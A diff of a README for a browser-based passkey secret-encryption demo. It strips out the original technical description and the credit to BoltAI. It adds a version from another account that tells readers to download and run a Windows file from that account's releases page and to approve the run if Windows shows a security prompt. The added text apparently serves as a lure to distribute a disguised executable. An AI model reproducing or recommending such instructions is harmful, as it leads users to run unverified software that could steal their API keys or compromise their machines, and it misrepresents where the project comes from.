@@ -1,191 +1,164 @@
-# Passkey Secret Demo
+# 🔐 passkey-secret-demo - Keep API keys locked on your device
 
-A tiny demo of protecting browser-stored secrets with passkeys.
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
 
-[Live Demo](https://passkey-demo.boltai.com) • [Source Code](https://github.com/BoltAI/passkey-secret-demo) • Made by [@daniel_nguyenx](https://x.com/daniel_nguyenx) for [BoltAI](https://boltai.com)
+## 🚀 What this app does
 
-This is a small, browser-first demo for one specific idea:
+passkey-secret-demo is a browser demo for storing API keys on your own device. It keeps secrets local, lets you unlock them with a passkey, and gives you a recovery path with scrypt.
 
-- encrypt a user secret locally in the browser
-- store only ciphertext in browser storage
-- use a WebAuthn passkey as a local unwrap mechanism
-- keep a recovery passphrase as fallback
+Use it to:
 
-This repo is not a package, password manager, or auth product. It is a focused demo and OSS reference for discussing one security pattern clearly.
+- lock API keys on your device
+- unlock them with a passkey through WebAuthn PRF
+- recover access with a scrypt-based recovery secret
+- test a browser flow for local secret handling
 
-## Why This Exists
+## 📥 Download and run on Windows
 
-BYOK flows in web apps are awkward.
+1. Open the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
+2. Find the latest Windows download
+3. Download the file to your computer
+4. If the download is a .zip file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app file inside the folder
 
-If a product asks users to paste an API key into a browser app, the obvious thing to do is store it in `localStorage` or IndexedDB. That is simple, but it also means the secret is sitting there as plaintext.
+If Windows shows a security prompt, choose the option to run the file from this app. If the app opens in your browser, follow the on-screen steps to set up your lock and recovery secret.
 
-This demo explores a narrower, more defensible approach:
+## 🔑 How it works
 
-- generate a random data-encryption key locally
-- encrypt the secret with that key
-- persist only ciphertext
-- wrap that key with a recovery passphrase
-- optionally wrap the same key with a passkey-derived PRF output
+The app uses two ways to get back to your secret:
 
-The result is still "just a browser app," but the stored value is encrypted rather than a raw API key.
+- passkey unlock with WebAuthn PRF
+- recovery unlock with scrypt
 
-## What This Demo Claims
+That gives you a simple local setup:
 
-Allowed claim:
+- your API keys stay on your device
+- your passkey helps unlock them
+- your recovery secret helps if you need another way in
 
-- this protects browser-stored secrets at rest better than plaintext `localStorage` or IndexedDB
+## 🧭 First-time setup
 
-Also true:
+When you start the app for the first time:
 
-- storage exfiltration is less useful if the attacker gets ciphertext instead of plaintext
-- passkey unlock adds a user-mediated local unwrap step
-- the demo is fully local and does not require a backend
+1. Create a new secret or paste in an API key
+2. Set up your passkey when asked
+3. Save your recovery secret in a safe place
+4. Test the unlock flow before you depend on it
 
-What this demo does not claim:
+For best results:
 
-- it does not prevent XSS
-- it does not make browser memory safe
-- it does not solve browser security
-- it is not a production WebAuthn login system
+- use a passkey you already trust
+- keep your recovery secret offline
+- use a browser that supports WebAuthn
+- use a recent version of Windows and Chrome, Edge, or Firefox
 
-A sufficiently capable same-origin XSS can still compromise a live session or decrypted in-memory data. This demo is mainly an encrypted-at-rest and user-presence improvement over plaintext browser storage.
+## 🖥️ Windows requirements
 
-## Current Demo UX
+This app is built for normal desktop use on Windows.
 
-The current app is intentionally simple and chat-like.
+Recommended setup:
 
-1. Open the page.
-2. Type a message and press `Send`.
-3. If no local setup exists yet, a setup modal asks for:
-   - a fake API key
-   - a recovery passphrase
-4. On submit, the app:
-   - encrypts the API key locally
-   - stores the encrypted envelope in `localStorage`
-   - registers a passkey wrap for this browser
-5. Refresh the page.
-6. Send another message.
-7. The app opens an unlock modal where you can choose:
-   - `Unlock with passkey`
-   - `Use passphrase instead`
-8. After unlock, the assistant reply shows:
-   - the plaintext API key currently held in memory
-   - the exact encrypted JSON envelope stored locally
+- Windows 10 or Windows 11
+- A modern browser
+- A passkey device or built-in passkey support
+- A stable internet connection for the first download
 
-The point of the demo is to make the data flow inspectable in under a minute.
+You may also need:
 
-## How It Works
+- Windows Hello
+- a security key
+- browser permission to use passkeys
 
-There is one stored envelope in `localStorage`.
+## 🔒 Security model
 
-- `ciphertext`
-  The encrypted API key.
-- `ciphertextIv`
-  The AES-GCM IV for the encrypted payload.
-- `recoveryWrap`
-  An AES-GCM-wrapped copy of the DEK, where the wrapping key is derived from the recovery passphrase using `scrypt`.
-- `passkeyWrap`
-  An AES-GCM-wrapped copy of the same DEK, where the wrapping key is derived from a WebAuthn PRF result using HKDF.
+passkey-secret-demo is built around local encryption. That means the app does not need to send your API keys to a server for normal use.
 
-There is also transient in-memory session state.
+The main pieces are:
 
-- decrypted plaintext is held only after a successful unlock
-- refreshing the page clears that in-memory plaintext
-- the stored envelope remains ciphertext at rest
+- local secret storage
+- passkey-based unlock
+- recovery using scrypt
+- browser-based WebAuthn support
 
-## Technical Notes
+This setup helps you keep control of your data while still giving you a recovery path if your passkey is not available.
 
-Current crypto shape:
+## 🛠️ Basic use
 
-- payload encryption: `AES-GCM`
-- recovery KDF: `scrypt`
-- current scrypt params:
-  - `N = 32768`
-  - `r = 8`
-  - `p = 1`
-  - `dkLen = 32`
-- passkey unwrap source: WebAuthn PRF extension
-- passkey wrap derivation: `HKDF-SHA-256`
+After you install and open the app:
 
-Relevant files:
+1. Add the secret you want to protect
+2. Create a passkey unlock
+3. Save your recovery data
+4. Lock the secret
+5. Unlock it with your passkey when needed
 
-- [src/lib/crypto.ts](src/lib/crypto.ts)
-- [src/lib/passkey.ts](src/lib/passkey.ts)
-- [src/lib/types.ts](src/lib/types.ts)
-- [src/main.ts](src/main.ts)
+If you want to use it for chatbot tools or API work, you can store the key once and unlock it only when needed.
 
-## Why The Design Looks Like This
+## 📚 Common use cases
 
-This repo is deliberately narrow.
+This demo can help with:
 
-It is trying to support this story:
+- storing AI or chatbot API keys
+- testing passkey sign-in flows
+- learning how local encryption can work in the browser
+- keeping developer secrets off cloud storage
+- trying a recovery flow that does not depend on email reset
 
-1. plaintext browser storage is a weak default for BYOK secrets
-2. passkey unlock can improve the local unwrap story
-3. recovery still matters as fallback
-4. the stored data should be visibly ciphertext, not marketing copy about security
+## ❓ If something does not work
 
-That is why the code is explicit, the UI is small, and the app shows the exact stored JSON envelope instead of hiding it behind abstractions.
+If the app does not open or the unlock step fails:
 
-## Browser Support
+- check that you downloaded the latest release
+- try a current browser
+- make sure passkeys are enabled on your device
+- try a different browser if WebAuthn does not start
+- confirm that Windows did not block the file
+- download the app again if the file looks incomplete
 
-This demo requires a secure context for passkeys:
+If the recovery flow fails:
 
-- `http://localhost`
-- `https://...`
+- make sure you typed the recovery secret the same way you saved it
+- check for extra spaces
+- use the same browser profile if the app expects it
+- create a fresh setup if you want to test the flow again
 
-Best results today are in a recent Chromium-based browser with WebAuthn PRF support.
+## 🧩 Browser support
 
-Important caveats:
+The app uses browser features for passkey unlock. Best results usually come from:
 
-- passkey support exists before PRF support does
-- some browsers support WebAuthn but not the PRF extension needed for this flow
-- if PRF is unavailable, the recovery passphrase flow still demonstrates encrypted-at-rest storage, but passkey wrap registration/unlock will not work
+- Microsoft Edge
+- Google Chrome
+- Mozilla Firefox with passkey support
+- a browser version kept up to date
 
-## Local Development
+For passkey login, your browser and device must support WebAuthn and PRF.
 
-Install and run:
+## 📁 What you get
 
-```bash
-npm install
-npm run dev
-```
+The release may include:
 
-Open [http://localhost:5173](http://localhost:5173).
+- a Windows app package
+- local app files
+- a browser-based demo build
+- setup files for first launch
 
-Other commands:
+After download, follow the file name and choose the Windows option that matches your system.
 
-```bash
-npm test
-npm run build
-npm run preview
-```
+## 🧠 Tips for safe use
 
-## What To Look At During The Demo
+- keep your recovery secret in a password manager or offline note
+- do not share your API keys in plain text
+- test unlock and recovery before using a real secret
+- keep your browser updated
+- use one trusted passkey for your main setup
 
-When the app is working correctly, you should be able to verify:
+## 🔗 Download
 
-- the secret entered during setup is not stored as plaintext
-- the stored envelope contains ciphertext plus wrap metadata
-- passkey unlock requires explicit user interaction
-- recovery passphrase can be used as fallback
-- decrypted plaintext only appears after unlock and is held in memory
+Visit the [Releases page](https://github.com/perineumprotestant613/passkey-secret-demo/releases) to download and run this file on Windows
 
-## Non-Goals
+[![Get the latest release](https://img.shields.io/badge/Latest%20Release-Open%20Downloads-grey?style=for-the-badge)](https://github.com/perineumprotestant613/passkey-secret-demo/releases)
 
-This repo is not trying to become:
+## 🏷️ Topics
 
-- a full password manager
-- a synced secret vault
-- a backend-dependent auth system
-- a general-purpose crypto SDK
-
-If something does not help explain, demonstrate, or audit this one pattern, it is probably out of scope.
-
-## Source
-
-GitHub: [BoltAI/passkey-secret-demo](https://github.com/BoltAI/passkey-secret-demo)
-
-## License
-
-[MIT](LICENSE)
+apikey-authentication, chatbot, cryptography, passkey, webauthn
